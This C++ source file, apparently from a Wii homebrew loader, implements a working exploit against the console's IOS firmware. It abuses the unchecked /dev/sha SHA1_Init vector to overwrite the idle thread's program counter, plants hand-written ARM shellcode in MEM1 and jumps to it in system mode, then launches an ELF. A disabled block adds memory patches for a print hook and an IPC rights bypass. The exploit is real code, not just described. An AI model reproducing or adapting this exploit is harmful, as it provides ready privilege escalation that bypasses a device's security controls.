#include "IOSBoot.hpp"

#include <new>
#include <ogc/cache.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

template <class T> constexpr T sramMirrToReal(T address)
{
    return reinterpret_cast<T>(reinterpret_cast<u32>(address) - 0xF2B00000);
}

constexpr u32 syscall(u32 id) { return 0xE6000010 | id << 5; }

constexpr u32 VFILE_ADDR = 0x91000000;
constexpr u32 VFILE_SIZE = 0x100000;

template <u32 TSize> struct VFile {
    static constexpr u32 MAGIC = 0x46494C45; /* FILE */

    VFile(const void* data, u32 len) : m_magic(MAGIC), m_length(len), m_pos(0)
    {
        ASSERT(len <= TSize);
        ASSERT(len >= 0x34);
        ASSERT(!memcmp(data,
                       "\x7F"
                       "ELF",
                       4));
        memcpy(m_data, data, len);
        m_data[7] = 0x61;
        m_data[8] = 1;
        DCFlushRange(reinterpret_cast<void*>(this), 32 + len);
    }

    u32 m_magic;
    u32 m_length;
    u32 m_pos;
    u32 m_pad[8 - 3];
    u8 m_data[TSize];
};

/*
 * Performs an IOS exploit and branches to the entrypoint in system mode.
 *
 * Exploit summary:
 * - IOS does not check validation of vectors with length 0.
 * - All memory regions mapped as readable are executable (ARMv5 has no
 *   'no execute' flag).
 * - NULL/0 points to the beginning of MEM1.
 * - The /dev/sha resource manager, part of IOSC, runs in system mode.
 * - It's obvious basically none of the code was audited at all.
 *
 * IOCTL 0 (SHA1_Init) writes to the context vector (1) without checking the
 * length at all. Two of the 32-bit values it initializes are zero.
 *
 * Common approach: Point the context vector to the LR on the stack and then
 * take control after return.
 * A much more stable approach taken here: Overwrite the PC of the idle thread,
 * which should always have its context start at 0xFFFE0000 in memory (across
 * IOS versions).
 */
s32 IOSBoot::Entry(u32 entrypoint)
{
    IOS::ResourceCtrl<u32> sha("/dev/sha");
    if (sha.fd() < 0)
        return sha.fd();

    irse::Log(LogS::Core, LogL::INFO, "Exploit: Setting up MEM1");
    u32* mem1 = reinterpret_cast<u32*>(MEM1_BASE);
    mem1[0] = 0x4903468D; // ldr r1, =0x10100000; mov sp, r1;
    mem1[1] = 0x49034788; // ldr r1, =entrypoint; blx r1;
    /* Overwrite reserved handler to loop infinitely */
    mem1[2] = 0x49036209; // ldr r1, =0xFFFF0014; str r1, [r1, #0x20];
    mem1[3] = 0x47080000; // bx r1
    mem1[4] = 0x10100000; // temporary stack
    mem1[5] = entrypoint;
    mem1[6] = 0xFFFF0014; // reserved handler

    IOS::IOVector<1, 2> vec;
    vec.in[0].data = NULL;
    vec.in[0].len = 0;
    vec.out[0].data = reinterpret_cast<void*>(0xFFFE0028);
    vec.out[0].len = 0;
    /* Unused vector utilized for cache safety */
    vec.out[1].data = MEM1_BASE;
    vec.out[1].len = 32;

    irse::Log(LogS::Core, LogL::INFO, "Exploit: Doing exploit call");
    return sha.ioctlv(0, vec);
}

extern u8 es_bin[];

/* Async ELF launch */
s32 IOSBoot::Launch(const void* data, u32 len)
{
    new (reinterpret_cast<void*>(VFILE_ADDR)) VFile<VFILE_SIZE>(data, len);

    return Entry(reinterpret_cast<u32>(es_bin) & ~0xC0000000);
}

s32 IOSBoot::Log::Callback(s32 result, [[maybe_unused]] void* usrdata)
{
    IOSBoot::Log* obj = reinterpret_cast<IOSBoot::Log*>(usrdata);

    if (result < 0) {
        irse::Log(LogS::Core, LogL::ERROR, "/dev/stdout error: %d", result);
        return 0;
    }
    puts(obj->logBuffer);
    if (!obj->reset)
        obj->restartEvent();
    else
        obj->reset = false;
    return 0;
}

IOSBoot::Log::Log()
{
    if (this->logRM.fd() == static_cast<s32>(IOSErr::NotFound)) {
        /* Unfortunately there isn't really a way to detect the moment the log
         * resource manager is created, so we just have to keep trying until it
         * succeeds. */
        for (s32 i = 0; i < 50; i++) {
            usleep(1000);
            new (&this->logRM) IOS::ResourceCtrl<s32>("/dev/stdout");
            if (this->logRM.fd() != static_cast<s32>(IOSErr::NotFound))
                break;
        }
    }
    if (this->logRM.fd() < 0) {
        irse::Log(LogS::Core, LogL::ERROR, "/dev/stdout open error: %d",
                  this->logRM.fd());
        return;
    }
    this->restartEvent();
}

#if 0
/* don't judge this code; it's not meant to be seen by eyes */

void IOSBoot::SetupPrintHook()
{
    static const u8 hook_code[] = {
        0x4A, 0x04, 0x68, 0x13, 0x18, 0xD0, 0x70, 0x01, 0x21, 0x00, 0x70,
        0x41, 0x33, 0x01, 0x60, 0x13, 0x47, 0x70, 0x00, 0x00,
        0x10, 0xC0, 0x00, 0x00 };
    *(u32*) 0x90C00000 = 4;
    DCFlushRange((void*) 0x90C00000, 0x10000);

    *(u32*) 0xCD4F744C = ((u32) (&hook_code) & ~0xC0000000) | 1;
}

void IOSBoot::ReadPrintHook()
{
    DCInvalidateRange((void*) 0x90C00000, 0x10000);
    printf("PRINT HOOK RESULT:\n%s", (char*) 0x90C00004);
}

void IOSBoot::testIPCRightsPatch()
{
    static constexpr u32 ios58BranchSrc = sramMirrToReal(0xFFFF3180);

    mask32(ios58BranchSrc, 0xFFFF0000, 0xE79C0000);
}
#endif